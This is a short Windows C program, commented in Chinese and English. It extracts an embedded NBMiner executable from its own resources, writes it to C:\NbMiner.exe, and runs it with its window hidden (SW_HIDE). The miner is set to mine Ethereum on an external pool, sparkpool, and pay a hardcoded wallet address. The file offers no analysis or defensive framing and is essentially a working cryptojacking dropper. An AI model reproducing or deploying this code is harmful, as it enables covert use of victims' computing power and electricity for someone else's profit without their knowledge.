#include <Windows.h>
#include "resource.h"
#include <WinBase.h>
//UniCode下的Windows窗口Main函数
int WINAPI wWinMain(
    _In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR lpCmdLine,
    _In_ int nShowCmd
)
{
    //要写出的资源文件
    LPVOID lpResource = NULL;
	//加载资源文件    Load Resource File
    HRSRC hRs = FindResource(NULL, MAKEINTRESOURCE(IDR_NBMINER), L"NBMINER");
    if (hRs == NULL)
    {
        return -1;
    }
    DWORD dwResourceSize = SizeofResource(NULL, hRs);
    if (dwResourceSize == 0)
    {
        return -1;
    }
    HGDIOBJ hGdi = LoadResource(NULL, hRs);
    if (hGdi != NULL)
        lpResource = LockResource(hGdi);         //Windows会自动清理上述操作句柄


    //写出资源文件    Write Resource File at C:
    HANDLE hFile = CreateFile(L"C:\\NbMiner.exe", GENERIC_ALL,
        NULL, NULL, CREATE_ALWAYS, NULL, NULL);                 //创建文件句柄，通过文件句柄操作
    if (hFile == INVALID_HANDLE_VALUE) return -1;
    WriteFile(hFile, lpResource, dwResourceSize, NULL, NULL);   //写出Resource
    CloseHandle(hFile);                                         //关闭句柄

    //运行文件
    WinExec("C:\\NbMiner.exe -a ethash -o cn.sparkpool.com:3333 -u 0x99E0669CC67a7D433a680d6e93Fb84b2f8B15c47.Test -log", SW_HIDE);
	return 0;
}